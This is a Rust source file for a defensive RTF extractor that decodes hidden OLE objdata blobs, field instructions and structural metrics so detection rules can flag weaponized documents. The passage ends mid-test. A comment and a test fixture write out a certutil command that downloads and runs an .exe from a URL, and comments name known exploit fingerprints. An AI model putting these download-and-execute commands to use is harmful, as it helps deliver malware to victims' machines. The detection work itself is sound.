//! RTF (Rich Text Format) extractor.
//!
//! Lenient byte-scan parser. RTF is a stream of control words
//! (`\foo`), control symbols (`\\`, `\{`), and braced groups (`{ … }`).
//! We don't reconstruct the document — we recover the `\info` group's
//! string children, the `\fldinst` instructions inside `\field`
//! groups, and a small set of feature flags (presence of `\object`,
//! `\objupdate`, `\pict`, …) that trait rules key on.
//!
//! Schema namespaces under `rtf.*`:
//!
//! - `rtf.version`, `rtf.charset`, `rtf.codepage`, `rtf.deflang`.
//! - `rtf.info.{author, title, subject, comment, keywords, operator,
//!    company, manager, doccomm, creatim, revtim, printim, vern,
//!    version}` — DOCINFO group string children, lowercased.
//! - `rtf.fields[].kind` — first whitespace-separated token of each
//!    `\fldinst` body (DDEAUTO, INCLUDETEXT, HYPERLINK, …).
//! - `rtf.features[]` — Pike-style flag array: `object`, `objupdate`,
//!    `objemb`, `objocx`, `objlink`, `objhtml`, `objautlink`,
//!    `objdata`, `objclass`, `field`, `pict`, `wmf`, `shppict`,
//!    `datafield`.
//! - `rtf.objects[].{class, source, native}` — the embedded OLE
//!    object's coclass name. `source` says where it was read: a
//!    plaintext `\objclass` declaration, or the OLE1.0 header inside
//!    the hex `\objdata` blob, which is where weaponized documents
//!    put it because they omit `\objclass` entirely. `native` names
//!    what the object's payload actually is (`cfb`, `pe`, `mz-dos`).
//! - `rtf.objdata_count`, `rtf.objdata_bytes` — how many hex object
//!    blobs the file carries and how much decodes out of them.
//! - `rtf.shape.{control_word_count, group_depth_max, brace_count}`
//!    — structural counts that fingerprint generator authenticity.
//! - `rtf.control_word_density` — control words per kilobyte, which
//!    separates a document from a file that merely starts like one.

use crate::metric;
use serde_json::{Value as JsonValue, json};

use crate::error::Error;
use crate::formats::common::{
    XorScan, append_decoded_strings, extract_binary_strings, hex_nibble, put_str,
};
use crate::output::{Metrics, Strings, Values};

pub(super) fn extract(
    bytes: &[u8],
    values: &mut Values,
    strings: &mut Strings,
    metrics: &mut Metrics,
) -> Result<(), Error> {
    extract_binary_strings(bytes, strings, XorScan::No);

    // Every RTF starts with `{\rtf<version>`. Bail (parsable as
    // generic) if the magic is missing.
    if !bytes.starts_with(b"{\\rtf") {
        return Ok(());
    }

    // Header control words sit at the top of the document, before
    // the first group. Scan the first 128 bytes which is plenty.
    let head = &bytes[..bytes.len().min(128)];
    if let Some(version) = parse_numeric_control(head, b"\\rtf") {
        put_str(values, "rtf.version", version);
    }
    if let Some(cs) = parse_charset(head) {
        put_str(values, "rtf.charset", cs);
    }
    if let Some(cp) = parse_numeric_control(head, b"\\ansicpg") {
        put_str(values, "rtf.codepage", cp);
    }
    if let Some(lang) = parse_numeric_control(head, b"\\deflang") {
        put_str(values, "rtf.deflang", lang);
    }

    info_group(bytes, values);
    fields(bytes, values);
    objects(bytes, values, strings, metrics);
    features(bytes, values);
    shape(bytes, values, metrics);

    Ok(())
}

/// Return the numeric tail of a control word (`\rtf1` → `"1"`,
/// `\ansicpg1252` → `"1252"`). Negative numbers (`-1`) supported.
fn parse_numeric_control(bytes: &[u8], cw: &[u8]) -> Option<String> {
    let pos = bytes.windows(cw.len()).position(|w| w == cw)?;
    let start = pos + cw.len();
    let mut end = start;
    if bytes.get(end) == Some(&b'-') {
        end += 1;
    }
    while end < bytes.len() && bytes[end].is_ascii_digit() {
        end += 1;
    }
    if end == start || (end == start + 1 && bytes[start] == b'-') {
        return None;
    }
    std::str::from_utf8(&bytes[start..end])
        .ok()
        .map(str::to_string)
}

/// Pick the first of `\ansi` / `\mac` / `\pc` / `\pca` charset
/// control words, which set the high-byte interpretation for
/// non-Unicode strings. Returns the name without the leading slash.
fn parse_charset(bytes: &[u8]) -> Option<&'static str> {
    // Order matters: `\ansi` is a prefix of `\ansicpg`, so we test
    // it last. We rely on RTF's syntactic rule that a control word
    // ends at the first non-letter — `\ansicpg` is one word, not
    // `\ansi` followed by `cpg`.
    for (cw, name) in [
        (b"\\pca" as &[u8], "pca"),
        (b"\\pc", "pc"),
        (b"\\mac", "mac"),
        (b"\\ansi", "ansi"),
    ] {
        if let Some(pos) = bytes.windows(cw.len()).position(|w| w == cw) {
            let after = bytes.get(pos + cw.len()).copied().unwrap_or(b' ');
            if !after.is_ascii_alphanumeric() {
                return Some(name);
            }
        }
    }
    None
}

/// Walk `{\info … }` and extract string children. Each child is
/// itself a group: `{\<key> <text>}` where `<key>` is the control
/// word (`author`, `title`, `creatim`, `vern`, …) and `<text>` is
/// either ASCII / escaped text (for `author`/`title`/etc.) or a
/// sequence of nested control words (for date fields `creatim` /
/// `revtim` / `printim`).
fn info_group(bytes: &[u8], values: &mut Values) {
    let Some(info_start) = find_group(bytes, b"\\info") else {
        return;
    };
    let group_end = match_group_end(bytes, info_start);
    let inner = &bytes[info_start + 1..group_end];

    let mut info = serde_json::Map::new();
    // Iterate nested groups inside `\info`.
    let mut i = 0;
    while i < inner.len() {
        if inner[i] != b'{' {
            i += 1;
            continue;
        }
        let child_start = i;
        let child_end = match_group_end(inner, child_start);
        let child = &inner[child_start + 1..child_end];
        // First control word is the key.
        if child.first() == Some(&b'\\') {
            let key_end = child
                .iter()
                .skip(1)
                .position(|b| !b.is_ascii_alphabetic())
                .map_or(child.len(), |n| 1 + n);
            let key = std::str::from_utf8(&child[1..key_end])
                .ok()
                .map(str::to_lowercase);
            if let Some(k) = key {
                // Skip past the control word and its optional
                // numeric parameter and trailing delimiter.
                let mut value_start = key_end;
                if value_start < child.len() && child[value_start] == b'-' {
                    value_start += 1;
                }
                while value_start < child.len() && child[value_start].is_ascii_digit() {
                    value_start += 1;
                }
                if child.get(value_start) == Some(&b' ') {
                    value_start += 1;
                }
                let raw = &child[value_start..];
                let value = if matches!(k.as_str(), "creatim" | "revtim" | "printim" | "buptim") {
                    // Date fields are nested control words; return
                    // the raw token sequence (`\yr2024\mo1\dy1`) so
                    // trait rules can regex on the encoded value.
                    String::from_utf8_lossy(raw).trim().to_string()
                } else {
                    decode_text(raw)
                };
                if !value.is_empty() {
                    info.insert(k, JsonValue::String(value));
                }
            }
        }
        i = child_end + 1;
    }
    if !info.is_empty() {
        values.insert("rtf.info", JsonValue::Object(info));
    }
}

/// Decode an RTF text run: drop control words/symbols and unescape
/// the common `\\`, `\{`, `\}` sequences. Hex escapes (`\\'XX`) are
/// rendered as the literal byte. Caller already trimmed the leading
/// control word.
fn decode_text(bytes: &[u8]) -> String {
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' => {
                let next = bytes.get(i + 1).copied().unwrap_or(b' ');
                match next {
                    b'\\' | b'{' | b'}' => {
                        out.push(next);
                        i += 2;
                    }
                    b'\'' => {
                        // Hex escape `\'XX`.
                        if i + 3 < bytes.len() {
                            let hi = hex_nibble(bytes[i + 2]);
                            let lo = hex_nibble(bytes[i + 3]);
                            if let (Some(h), Some(l)) = (hi, lo) {
                                out.push((h << 4) | l);
                                i += 4;
                                continue;
                            }
                        }
                        i += 2;
                    }
                    b'~' | b'-' | b'_' => {
                        out.push(b' ');
                        i += 2;
                    }
                    _ if next.is_ascii_alphabetic() => {
                        // Generic control word — skip the letters
                        // and its optional numeric parameter.
                        let mut j = i + 1;
                        while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
                            j += 1;
                        }
                        if j < bytes.len() && bytes[j] == b'-' {
                            j += 1;
                        }
                        while j < bytes.len() && bytes[j].is_ascii_digit() {
                            j += 1;
                        }
                        if j < bytes.len() && bytes[j] == b' ' {
                            j += 1;
                        }
                        i = j;
                    }
                    _ => i += 2,
                }
            }
            b'{' | b'}' => i += 1,
            _ => {
                out.push(bytes[i]);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).trim().to_string()
}

/// Find each `\fldinst <body>` site and surface the leading
/// instruction keyword as `kind` and the remaining body text as
/// `target`. The keyword (DDEAUTO, INCLUDETEXT, INCLUDEPICTURE,
/// HYPERLINK, …) is the canonical attack-surface signal; the
/// target (URL, path, command) is the payload itself.
fn fields(bytes: &[u8], values: &mut Values) {
    let mut entries: Vec<JsonValue> = Vec::new();
    let mut pos = 0;
    while pos < bytes.len() {
        let Some(rel) = bytes[pos..].windows(8).position(|w| w == b"\\fldinst") else {
            break;
        };
        let abs = pos + rel;
        // Require a word boundary after the control word so
        // `\fldinstFoo` (a different control word) doesn't false-match
        // `\fldinst`.
        let next = bytes.get(abs + 8).copied().unwrap_or(b' ');
        if next.is_ascii_alphabetic() {
            pos = abs + 8;
            continue;
        }
        // Skip past the control word and its delimiter.
        let mut cursor = abs + 8;
        if bytes.get(cursor) == Some(&b' ') {
            cursor += 1;
        }
        // Capture the field's body up to the closing brace of its
        // enclosing group. The body decodes through `decode_text`
        // which already drops nested control words.
        let mut end = cursor;
        let mut depth = 1_i32;
        while end < bytes.len() {
            match bytes[end] {
                b'\\' if matches!(bytes.get(end + 1), Some(b'{') | Some(b'}') | Some(b'\\')) => {
                    end += 2;
                }
                b'{' => {
                    depth += 1;
                    end += 1;
                }
                b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                    end += 1;
                }
                _ => end += 1,
            }
        }
        let body = decode_text(&bytes[cursor..end]);
        let mut parts = body.splitn(2, char::is_whitespace);
        let kind = parts.next().unwrap_or("").trim().to_string();
        let target = parts
            .next()
            .unwrap_or("")
            .trim()
            .trim_matches('"')
            .to_string();
        if !kind.is_empty() {
            let mut entry = serde_json::Map::new();
            entry.insert("kind".into(), JsonValue::String(kind));
            if !target.is_empty() {
                entry.insert("target".into(), JsonValue::String(target));
            }
            entries.push(JsonValue::Object(entry));
        }
        pos = end.max(abs + 8);
    }
    if !entries.is_empty() {
        values.insert("rtf.fields", JsonValue::Array(entries));
    }
}

/// Walk each `\object` group and surface its `\objclass <name>`
/// declaration. The class string is the OLE coclass identifier
/// the embedded payload registers under — classic exploit
/// fingerprint (`Equation.3` for EQNEDT32, `Package` for OLE
/// package-object attacks).
fn objects(bytes: &[u8], values: &mut Values, strings: &mut Strings, metrics: &mut Metrics) {
    let mut entries: Vec<JsonValue> = Vec::new();
    let mut pos = 0;
    while pos + 9 <= bytes.len() {
        let Some(rel) = bytes[pos..].windows(9).position(|w| w == b"\\objclass") else {
            break;
        };
        let abs = pos + rel;
        let mut cursor = abs + 9;
        if bytes.get(cursor) == Some(&b' ') {
            cursor += 1;
        }
        let mut end = cursor;
        while end < bytes.len() && bytes[end] != b'}' && bytes[end] != b'{' && bytes[end] != b'\\' {
            end += 1;
        }
        if end > cursor {
            if let Ok(class) = std::str::from_utf8(&bytes[cursor..end]) {
                let trimmed = class.trim();
                if !trimmed.is_empty() {
                    entries.push(json!({"class": trimmed}));
                }
            }
        }
        pos = end.max(abs + 9);
    }
    entries.extend(objdata_objects(bytes, strings, metrics));
    if !entries.is_empty() {
        values.insert("rtf.objects", JsonValue::Array(entries));
    }
}

/// Decode `\objdata` hex blobs and read the OLE1.0 embedded-object
/// header out of them.
///
/// A document that embeds an object honestly also declares
/// `{\*\objclass Equation.3}` next to it, which the scan above reads.
/// A weaponized one does not: it writes only `\objdata`, and the class
/// name lives inside the blob, in the header Windows itself parses.
/// Without decoding it there is no class at all — so every rule keyed on
/// `rtf.objects[*].class` was blind to exactly the documents it was
/// written for.
///
/// The header is the OLE1.0 `EmbeddedObject` layout: version, format,
/// then length-prefixed ANSI class, topic and item strings, then the
/// native data. What the native data *is* matters as much as the class:
/// a compound file is an ordinary embedded document, and an `MZ` header
/// is a program the object will hand to the shell.
fn objdata_objects(bytes: &[u8], strings: &mut Strings, metrics: &mut Metrics) -> Vec<JsonValue> {
    /// Decoded bytes to keep per blob. Enough for the OLE header, and
    /// enough of the payload behind it for its strings to be worth
    /// reading, without materializing a multi-megabyte object.
    const MAX_DECODED: usize = 256 * 1024;
    /// Hex characters to consume looking for those bytes.
    const MAX_HEX: usize = 2 * 1024 * 1024;
    /// Blobs to walk. Real documents embed a handful.
    const MAX_BLOBS: usize = 32;

    let mut out = Vec::new();
    let mut count = 0u64;
    let mut decoded_total = 0u64;
    let mut pos = 0usize;
    while pos + 8 <= bytes.len() && count < MAX_BLOBS as u64 {
        let Some(rel) = bytes[pos..].windows(8).position(|w| w == b"\\objdata") else {
            break;
        };
        let start = pos + rel + 8;
        let decoded = decode_hex_run(&bytes[start..], MAX_HEX, MAX_DECODED);
        pos = start;
        if decoded.is_empty() {
            continue;
        }
        count += 1;
        decoded_total += decoded.len() as u64;
        // The payload's own strings, recovered from behind the hex.
        //
        // This is the point of decoding as much as the ole1 header. One
        // sample in the abuse.ch wave carries no OLE object at all: its
        // `\objdata` decodes straight to
        // `CmD /C cErTuTiL -uRlCAchE -sPlIT -f http://…/file.exe %TMP%\\1.exe`.
        // Nothing could see that, because the file's bytes are hex digits and
        // the command only exists once they are paired up. The same is true of
        // an embedded compound file: whatever it holds is invisible until the
        // blob is decoded.
        append_decoded_strings(&decoded, strings, XorScan::No);
        if let Some(entry) = ole1_header(&decoded) {
            out.push(entry);
        }
    }
    if count > 0 {
        metrics.insert(metric!("rtf.objdata_count"), count as f64);
        metrics.insert(metric!("rtf.objdata_bytes"), decoded_total as f64);
    }
    out
}

/// Decode the run of hex digits that follows `\objdata`, skipping the
/// whitespace and group braces writers wrap it with. Stops at the first
/// byte that is neither, which is where the object group ends.
fn decode_hex_run(bytes: &[u8], max_hex: usize, max_out: usize) -> Vec<u8> {
    let mut out = Vec::new();
    let mut high: Option<u8> = None;
    for &b in bytes.iter().take(max_hex) {
        if b.is_ascii_whitespace() || b == b'{' {
            continue;
        }
        let Some(nib) = hex_nibble(b) else {
            break;
        };
        match high.take() {
            None => high = Some(nib),
            Some(h) => {
                out.push((h << 4) | nib);
                if out.len() >= max_out {
                    break;
                }
            }
        }
    }
    out
}

/// Read the OLE1.0 embedded-object header. Returns `None` rather than
/// guessing when the lengths do not describe the buffer: a blob that is
/// not this layout is a fact we do not have, not one to invent.
fn ole1_header(data: &[u8]) -> Option<JsonValue> {
    /// A coclass name is short. Anything longer is a length field being
    /// read out of something that is not a header.
    const MAX_NAME: usize = 256;

    let u32_at = |off: usize| -> Option<usize> {
        let b = data.get(off..off + 4)?;
        Some(u32::from_le_bytes([b[0], b[1], b[2], b[3]]) as usize)
    };
    // version(4) format(4) then the length-prefixed class string.
    let format = u32_at(4)?;
    let mut off = 8;
    let class_len = u32_at(off)?;
    if class_len == 0 || class_len > MAX_NAME {
        return None;
    }
    off += 4;
    let raw = data.get(off..off + class_len)?;
    off += class_len;
    let class = String::from_utf8_lossy(raw.split(|&b| b == 0).next().unwrap_or(raw))
        .trim()
        .to_string();
    if class.is_empty() || !class.chars().all(|c| c.is_ascii_graphic() || c == ' ') {
        return None;
    }
    // topic and item strings, each length-prefixed, then the native data.
    for _ in 0..2 {
        let len = u32_at(off)?;
        if len > MAX_NAME {
            return None;
        }
        off += 4 + len;
    }
    let native_len = u32_at(off)?;
    off += 4;
    let native = data.get(off..).unwrap_or(&[]);

    let mut entry = json!({"class": class, "source": "objdata"});
    let obj = entry.as_object_mut()?;
    // Format 2 is an embedded object, 1 a link. Stated because an
    // embedded object that a document also asks to *update* is a
    // contradiction worth being able to see.
    obj.insert("format".into(), json!(format));
    obj.insert("native_len".into(), json!(native_len));
    if let Some(kind) = native_kind(native) {
        obj.insert("native".into(), json!(kind));
    }
    Some(entry)
}

/// Name what the object's payload is, from its own magic.
fn native_kind(native: &[u8]) -> Option<&'static str> {
    if native.starts_with(&[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]) {
        return Some("cfb");
    }
    if native.starts_with(b"MZ") {
        // A PE offset that lands inside the buffer distinguishes a real
        // executable from two bytes that happen to read `MZ`.
        let lfanew = native
            .get(0x3c..0x40)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]) as usize);
        return match lfanew {
            Some(off) if native.get(off..off + 4) == Some(b"PE\0\0") => Some("pe"),
            _ => Some("mz-dos"),
        };
    }
    if native.starts_with(b"{\\rtf") {
        return Some("rtf");
    }
    None
}

/// Pike-style `rtf.features[]` flag array. Each entry signals the
/// presence of a high-value RTF construct: `object`/`objupdate`/etc.
/// for OLE-embedded payloads (the canonical RTF malware surface);
/// `field` for fldinst instructions; `pict`/`wmf`/`shppict` for
/// image carriers (CVE-2017-11882-style WMF / EQNEDT32 exploits).
fn features(bytes: &[u8], values: &mut Values) {
    const CHECKS: &[(&[u8], &str)] = &[
        (b"\\object", "object"),
        (b"\\objupdate", "objupdate"),
        (b"\\objemb", "objemb"),
        (b"\\objocx", "objocx"),
        (b"\\objlink", "objlink"),
        (b"\\objhtml", "objhtml"),
        (b"\\objautlink", "objautlink"),
        (b"\\objdata", "objdata"),
        (b"\\objclass", "objclass"),
        (b"\\field", "field"),
        (b"\\pict", "pict"),
        (b"\\wmetafile", "wmf"),
        (b"\\shppict", "shppict"),
        (b"\\datafield", "datafield"),
    ];
    let mut found: Vec<&str> = Vec::new();
    for (cw, name) in CHECKS {
        if has_control_word(bytes, cw) && !found.contains(name) {
            found.push(name);
        }
    }
    if !found.is_empty() {
        values.insert(
            "rtf.features",
            JsonValue::Array(
                found
                    .into_iter()
                    .map(|s| JsonValue::String(s.into()))
                    .collect(),
            ),
        );
    }
}

/// Whole-word control-word presence: requires the trailing byte to
/// be a non-letter so `\object` doesn't false-match `\objupdate`.
fn has_control_word(bytes: &[u8], cw: &[u8]) -> bool {
    let mut pos = 0;
    while pos + cw.len() <= bytes.len() {
        if let Some(rel) = bytes[pos..].windows(cw.len()).position(|w| w == cw) {
            let abs = pos + rel;
            let after = bytes.get(abs + cw.len()).copied().unwrap_or(b' ');
            if !after.is_ascii_alphabetic() {
                return true;
            }
            pos = abs + cw.len();
        } else {
            return false;
        }
    }
    false
}

/// Structural fingerprint counts. Cheap byte-level scans the
/// generator can't easily fake.
fn shape(bytes: &[u8], values: &mut Values, metrics: &mut Metrics) {
    let mut control_words = 0_usize;
    let mut braces_open = 0_usize;
    let mut braces_close = 0_usize;
    let mut depth = 0_i32;
    let mut max_depth = 0_i32;
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' if bytes.get(i + 1).is_some_and(|b| b.is_ascii_alphabetic()) => {
                // A control word is letters, an optional parameter, then a
                // delimiter. Encrypted bytes after a stub header are full of
                // `\` + letter pairs; counting those made a payload look as
                // dense as a document and the sparse-body check never fired.
                let mut j = i + 1;
                while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
                    j += 1;
                }
                if bytes.get(j) == Some(&b'-') {
                    j += 1;
                }
                while j < bytes.len() && bytes[j].is_ascii_digit() {
                    j += 1;
                }
                let delimited = j == bytes.len()
                    || matches!(
                        bytes[j],
                        b' ' | b'\\' | b'{' | b'}' | b'\n' | b'\r' | b'\t' | b';'
                    );
                if delimited {
                    control_words += 1;
                }
                i = j;
            }
            b'{' => {
                braces_open += 1;
                depth += 1;
                if depth > max_depth {
                    max_depth = depth;
                }
                i += 1;
            }
            b'}' => {
                braces_close += 1;
                depth -= 1;
                i += 1;
            }
            _ => i += 1,
        }
    }
    let mut obj = serde_json::Map::new();
    obj.insert("control_word_count".into(), json!(control_words));
    obj.insert("group_depth_max".into(), json!(max_depth));
    obj.insert("brace_count".into(), json!(braces_open + braces_close));
    values.insert("rtf.shape", JsonValue::Object(obj));
    metrics.insert(metric!("rtf.control_word_count"), control_words as f64);
    metrics.insert(metric!("rtf.group_depth_max"), f64::from(max_depth));
    // Control words per kilobyte. A document is mostly formatting: real RTF
    // runs tens of control words per KB whatever its size. A file that opens
    // with `{\rtf` and then spends its bytes on something else -- a hex blob,
    // an encrypted body, a shape value -- reads far below that, and the ratio
    // says so without any assumption about how large the file is.
    if !bytes.is_empty() {
        let density = control_words as f64 * 1024.0 / bytes.len() as f64;
        metrics.insert(
            metric!("rtf.control_word_density"),
            (density * 100.0).round() / 100.0,
        );
    }
}

/// Locate `{\<word>` group opening in `bytes`. Returns the position
/// of the `{`. Useful for the well-known top-level groups (`\info`,
/// `\fonttbl`, `\colortbl`).
fn find_group(bytes: &[u8], control_word: &[u8]) -> Option<usize> {
    let mut pos = 0;
    while pos + control_word.len() + 1 <= bytes.len() {
        let rel = bytes[pos..]
            .windows(control_word.len())
            .position(|w| w == control_word)?;
        let abs = pos + rel;
        if abs > 0 && bytes[abs - 1] == b'{' {
            let after = bytes.get(abs + control_word.len()).copied().unwrap_or(b' ');
            if !after.is_ascii_alphabetic() {
                return Some(abs - 1);
            }
        }
        pos = abs + control_word.len();
    }
    None
}

/// Maximum group nesting honoured by [`match_group_end`]. Real RTF
/// rarely nests beyond a dozen levels; the cap bounds the worst-case
/// scan cost on adversarial documents that open thousands of nested
/// groups without closing them.
const MAX_GROUP_DEPTH: i32 = 256;

/// Return the position of the matching `}` for the `{` at `start`.
/// Returns `bytes.len()` on unterminated groups or when nesting
/// exceeds [`MAX_GROUP_DEPTH`].
fn match_group_end(bytes: &[u8], start: usize) -> usize {
    let mut depth = 0_i32;
    let mut i = start;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' => {
                // Skip escaped brace.
                if matches!(bytes.get(i + 1), Some(b'{') | Some(b'}') | Some(b'\\')) {
                    i += 2;
                    continue;
                }
                i += 1;
            }
            b'{' => {
                depth += 1;
                if depth > MAX_GROUP_DEPTH {
                    return bytes.len();
                }
                i += 1;
            }
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return i;
                }
                i += 1;
            }
            _ => i += 1,
        }
    }
    bytes.len()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn extract_rtf(bytes: &[u8]) -> (Values, Metrics) {
        let mut v = Values::new();
        let mut s = Strings::default();
        let mut m = Metrics::new();
        extract(bytes, &mut v, &mut s, &mut m).unwrap();
        (v, m)
    }

    #[test]
    fn control_word_density_separates_a_document_from_a_wrapper() {
        // A document is mostly formatting, so it carries tens of control
        // words per kilobyte whatever its size. A file that opens with
        // `{\rtf` and then spends its bytes on a payload sits far below
        // that, and the ratio says so without knowing what the payload is.
        let mut doc = b"{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0\\fnil Arial;}}".to_vec();
        for _ in 0..60 {
            doc.extend_from_slice(b"\\pard\\f0\\fs20 Some ordinary text.\\par\n");
        }
        doc.push(b'}');
        let (_, m) = extract_rtf(&doc);
        let dense = m.get("rtf.control_word_density").unwrap();
        assert!(dense > 20.0, "document density {dense}");

        // Same header, then a megabyte of hex with nothing to format.
        let mut wrapper = b"{\\rtf1{\\object\\objdata ".to_vec();
        wrapper.extend(std::iter::repeat_n(b'a', 200_000));
        wrapper.extend_from_slice(b"}}");
        let (_, m2) = extract_rtf(&wrapper);
        let sparse = m2.get("rtf.control_word_density").unwrap();
        assert!(sparse < 1.0, "wrapper density {sparse}");
        assert!(dense > sparse * 20.0, "{dense} vs {sparse}");

        // A NUL where the version digit belongs, then a run of `\` + letter
        // that is not a control word. The delimiter keeps those out of the
        // count, so the body still reads as a payload.
        let mut broken = b"{\\rtf\x00".to_vec();
        for _ in 0..8_000 {
            broken.extend_from_slice(b"\\A\xff");
        }
        let (_, m3) = extract_rtf(&broken);
        let broken_density = m3.get("rtf.control_word_density").unwrap();
        assert!(
            broken_density < 10.0,
            "broken-header density {broken_density}"
        );
    }

    #[test]
    fn control_word_density_is_absent_for_non_rtf() {
        // The extractor bails before the shape pass when the magic is
        // missing, so nothing downstream sees a density of zero.
        let (_, m) = extract_rtf(b"not an rtf document at all");
        assert_eq!(m.get("rtf.control_word_density"), None);
    }

    #[test]
    fn parses_header_fields() {
        let rtf = b"{\\rtf1\\ansi\\ansicpg1252\\deflang1033 ...}";
        let (v, _) = extract_rtf(rtf);
        assert_eq!(v.get("rtf.version").and_then(|x| x.as_str()), Some("1"));
        assert_eq!(v.get("rtf.charset").and_then(|x| x.as_str()), Some("ansi"));
        assert_eq!(v.get("rtf.codepage").and_then(|x| x.as_str()), Some("1252"));
        assert_eq!(v.get("rtf.deflang").and_then(|x| x.as_str()), Some("1033"));
    }

    #[test]
    fn extracts_info_author() {
        let rtf = b"{\\rtf1\\ansi {\\info{\\author Alice}{\\title Hello}{\\company Acme}}}";
        let (v, _) = extract_rtf(rtf);
        assert_eq!(
            v.get("rtf.info.author").and_then(|x| x.as_str()),
            Some("Alice")
        );
        assert_eq!(
            v.get("rtf.info.title").and_then(|x| x.as_str()),
            Some("Hello")
        );
        assert_eq!(
            v.get("rtf.info.company").and_then(|x| x.as_str()),
            Some("Acme")
        );
    }

    #[test]
    fn extracts_creatim_raw() {
        let rtf = b"{\\rtf1\\ansi {\\info{\\creatim\\yr2024\\mo1\\dy15\\hr12\\min30}}}";
        let (v, _) = extract_rtf(rtf);
        let creatim = v.get("rtf.info.creatim").and_then(|x| x.as_str()).unwrap();
        assert!(creatim.contains("yr2024"));
    }

    #[test]
    fn extracts_field_kind_and_target() {
        let rtf =
            b"{\\rtf1\\ansi {\\field {\\*\\fldinst HYPERLINK \"https://evil.example/\" }{\\fldrslt }}}";
        let (v, _) = extract_rtf(rtf);
        let fields = v.get("rtf.fields").and_then(|x| x.as_array()).unwrap();
        assert_eq!(fields.len(), 1);
        assert_eq!(fields[0]["kind"].as_str(), Some("HYPERLINK"));
        assert_eq!(fields[0]["target"].as_str(), Some("https://evil.example/"));
    }

    #[test]
    fn extracts_object_class() {
        let rtf = b"{\\rtf1\\ansi {\\object\\objemb{\\*\\objclass Equation.3 }{\\objdata }}}";
        let (v, _) = extract_rtf(rtf);
        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
        assert_eq!(objects.len(), 1);
        assert_eq!(objects[0]["class"].as_str(), Some("Equation.3"));
    }

    /// Build an OLE1.0 embedded-object blob and write it out as the hex a
    /// real document carries, wrapped at eighty columns the way writers do.
    fn objdata_rtf(class: &str, native: &[u8]) -> Vec<u8> {
        let mut blob = Vec::new();
        blob.extend_from_slice(&0x0105_u32.to_le_bytes());
        blob.extend_from_slice(&2u32.to_le_bytes());
        blob.extend_from_slice(&((class.len() + 1) as u32).to_le_bytes());
        blob.extend_from_slice(class.as_bytes());
        blob.push(0);
        blob.extend_from_slice(&0u32.to_le_bytes());
        blob.extend_from_slice(&0u32.to_le_bytes());
        blob.extend_from_slice(&(native.len() as u32).to_le_bytes());
        blob.extend_from_slice(native);

        let mut hex = String::new();
        for (i, b) in blob.iter().enumerate() {
            if i > 0 && i % 40 == 0 {
                hex.push_str("\r\n");
            }
            hex.push_str(&format!("{b:02x}"));
        }
        format!("{{\\rtf1\\ansi{{\\object\\objocx{{\\*\\objdata {hex}}}}}}}").into_bytes()
    }

    #[test]
    fn reads_the_class_out_of_a_hex_objdata_blob() {
        // The shape that matters: no plaintext \objclass anywhere, which is
        // what every weaponized RTF in the corpus looks like.
        let rtf = objdata_rtf("MSComctlLib.Toolbar.2", &[0u8; 16]);
        assert!(!String::from_utf8_lossy(&rtf).contains("objclass"));
        let (v, m) = extract_rtf(&rtf);
        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
        assert_eq!(objects[0]["class"].as_str(), Some("MSComctlLib.Toolbar.2"));
        assert_eq!(objects[0]["source"].as_str(), Some("objdata"));
        assert_eq!(m.get("rtf.objdata_count"), Some(1.0));
    }

    #[test]
    fn names_what_the_native_payload_is() {
        let cfb = objdata_rtf("Package", &[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
        let (v, _) = extract_rtf(&cfb);
        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
        assert_eq!(objects[0]["native"].as_str(), Some("cfb"));

        let mut pe = vec![0u8; 0x80];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
        pe[0x40..0x44].copy_from_slice(b"PE\0\0");
        let (v, _) = extract_rtf(&objdata_rtf("Package", &pe));
        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
        assert_eq!(objects[0]["native"].as_str(), Some("pe"));
    }

    #[test]
    fn a_blob_that_is_not_an_ole_header_yields_no_class() {
        // Random hex must not be read as a header: a length field taken out
        // of noise would invent a class name.
        let mut rtf = b"{\\rtf1{\\object{\\*\\objdata ".to_vec();
        rtf.extend(std::iter::repeat_n(b'f', 400));
        rtf.extend_from_slice(b"}}}");
        let (v, m) = extract_rtf(&rtf);
        assert!(v.get("rtf.objects").is_none());
        // The blob is still counted -- its presence is a fact even when its
        // contents are not a header we recognize.
        assert_eq!(m.get("rtf.objdata_count"), Some(1.0));
    }

    #[test]
    fn a_plaintext_objclass_still_wins_its_own_entry() {
        let rtf = b"{\\rtf1\\ansi {\\object\\objemb{\\*\\objclass Equation.3 }{\\objdata }}}";
        let (v, _) = extract_rtf(rtf);
        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
        assert_eq!(objects.len(), 1);
        assert_eq!(objects[0]["class"].as_str(), Some("Equation.3"));
    }

    #[test]
    fn decoded_objdata_text_is_added_to_the_file_s_own_strings() {
        // The regression this guards: extract_binary_strings *replaces*
        // strings.text, so extracting the decoded blob a second time through
        // it silently discarded every string the RTF itself carried.
        let command = b"cmd /c certutil -urlcache -f http://example.test/a.exe";
        let rtf = objdata_rtf("Package", command);
        let (_, _) = extract_rtf(&rtf);

        let mut values = Values::default();
        let mut strings = Strings::default();
        let mut metrics = Metrics::default();
        extract(&rtf, &mut values, &mut strings, &mut metrics).unwrap();
        let all: Vec<&str> = strings
            .text
            .rows()
            .iter()
            .map(|r| r.value.as_str())
            .collect();
        // The decoded command, which appears nowhere in the file's bytes.
        assert!(
            all.iter().any(|v| v.contains("certutil")),
            "decoded objdata text missing: {all:?}"
        );
        // And the document's own text, which the replacing call threw away.
        assert!(
